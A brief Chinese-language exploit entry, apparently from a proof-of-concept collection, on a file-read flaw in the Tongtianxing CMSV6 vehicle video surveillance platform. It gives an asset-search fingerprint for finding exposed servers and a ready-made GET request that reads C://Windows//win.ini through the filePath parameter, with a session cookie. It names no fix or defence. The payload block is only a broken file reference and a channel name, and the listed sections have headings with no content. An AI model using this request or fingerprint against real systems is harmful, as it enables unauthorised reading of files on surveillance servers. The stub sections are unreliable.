# 通天星CMSV6车载视频监控平台StandardReportMediaAction_getImage存在信息泄露漏洞

- **系统**：通天星CMSV6车载视频监控平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="./open/webApi.html"`
- **请求**：`GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=82D471F9BEF54995F73170C5647FAF54`

**请求体 / payload**
```
\[通天星-CMSV6-standardreportmediaaction-getimage-文件读取.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 通天星CMSV6车载视频监控平台 StandardReportMediaAction\_getImage存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通天星CMSV6车载视频监控平台